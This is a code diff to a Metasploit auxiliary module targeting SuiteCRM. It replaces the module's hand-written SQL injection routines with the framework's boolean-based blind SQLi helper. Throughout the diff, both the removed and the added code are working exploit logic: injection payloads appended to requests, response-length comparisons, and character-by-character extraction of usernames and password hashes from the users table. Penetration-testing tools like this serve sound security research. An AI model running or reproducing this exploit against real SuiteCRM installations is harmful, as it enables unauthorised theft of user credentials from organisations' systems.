@@ -8,9 +8,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::SQLi::BooleanBasedBlindMixin
-
-  require 'pry'
 
   def initialize(info = {})
     super(
@@ -21,6 +18,7 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'Exodus Intelligence', # Advisory
           'jheysel-r7', # poc + msf module
+          'Redouane NIBOUCHA <rniboucha@yahoo.fr>' # sql injection help
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -132,67 +130,71 @@ class MetasploitModule < Msf::Auxiliary
     res
   end
 
-  # A valid uid is required to successfully exploit to the blind boolean sqli
-  # @return a string of the first UID returned by the server
-  def get_uid
-    # By sending a blank UID the server responds with the info for all users
-    uid = request('').body.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/)[0]
-    fail_with(Failure::NotFound, 'Unable to retrieve a uid from the server.') unless uid
-    uid
-  end
-
-  # This method uses UNION based injection to collect the user names from the users
   # @return an array of usernames
-  def get_user_names
-    res = request('\\,))+UNION+select+*+from+users;+--+')
-    users = []
-    res.body.each_line do |user|
-      username = user.match(/"([\w\s]+)",/)
-      next if username[1] == 'Name'
-
-      print_good("Found user: #{username[1]}")
-      users << username[1]
-    end
-    users
+  def get_user_names(sqli)
+    users_encoded = sqli.run_sql("select to_base64(group_concat(user_name)) from users")
+    Rex::Text.decode_base64(users_encoded).split(',')
   end
 
   # Use blind boolean SQL injection to determine the user_hashes of given usernames
-  def get_user_hashes(users)
-    hex_user_names = []
-    hash_length = 60
-    users.each do |user|
-      hex_user_names << user.each_byte.map { |b| b.to_s(16) }.join.prepend('0x')
+  def get_user_hashes(sqli, users)
+    users.map{|username|
+      [ username, sqli.run_sql("select user_hash from users where user_name='#{username}'") ]
+    }
+  end
+
+  def init_sqli
+    wrong_resp_length = request(",\\,))+AND+1=2;+--+")&.body&.length
+    sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do|payload|
+      fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')
+      length1 = request(",\\,))+OR+(#{payload});+--+")&.body&.length
+      length1 != wrong_resp_length
     end
 
-    uid = get_uid
-    postive_response_length = request(uid).body.length
-    print("postive_response_length is #{postive_response_length}\n")
-    charset = '$abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-./'
-    charset_bytes = charset.each_byte.map { |b| b.to_s(16) }
-    hex_user_names.each do |hex_user_name|
-      x = 0
-      hex_hash = ''
-      while x < hash_length
-        x += 1
-        charset_bytes.each do |byte|
-          payload = "#{uid},\\,))+AND+(select+(select+case+when+((select+user_hash+from+users+where+user_name=#{hex_user_name})+like+binary+0x#{hex_hash}#{byte}25)+then+1+else+2+end)=1);+--+"
-          body_length = request(payload).body.length
-          next unless body_length == postive_response_length
+    # redefine blind_detect_length and blind_dump_data because of the bad characters the payload cannot include
 
-          hex_hash << byte
-          print("Got char: 0x#{byte}. Hash for user #{hex_user_name} is now 0x#{hex_hash}\r")
-          break
-        end
+    def sqli.blind_detect_length(query, timebased=false)
+      output_length = 0
+      loop do
+        break if blind_request("length(cast((#{query}) as binary))=#{output_length}")
+        output_length += 1
       end
-      hash = [hex_hash].pack('H*')
-      print_good("User #{user} has user_hash: #{hash}")
+      output_length
     end
+
+    def sqli.blind_dump_data(query, length, known_bits=0, bits_to_guess=8, timebased=false)
+      charset = 32.upto(126).to_a + 32.times.to_a + 127.upto(255).to_a
+
+      # MySQL like operator considers the following characters as wildcards
+      [ '%', '_'].each do|char|
+        charset.delete(char.ord)
+      end
+
+      output = [ ]
+      length.times do|j|
+        character = charset.detect{|byte|
+          blind_request("(select case when ((#{query})+like+binary "\
+          "0x#{output.map{|e|e.to_s(16).rjust(2,?0)}.join}#{byte.to_s(16).rjust(2,?0)}25)"\
+          " then 1 else 2 end)=1")
+        }
+        character = '?' if character.nil? # can be '_' or '%'
+        output << character;
+      end
+      output.map(&:chr).join
+    end
+
+    sqli
   end
 
   def run_host(_ip)
     authenticate unless @authenticated
     fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
-    users = get_user_names
-    hashes = get_user_hashes(users)
+    sqli = init_sqli
+    users = get_user_names(sqli)
+    print_status "users = #{users.to_s}"
+    hashes = get_user_hashes(sqli, users)
+    hashes.each do|(username, hash)|
+      print_good "username : #{username} ; hash : #{hash}"
+    end
   end
 end
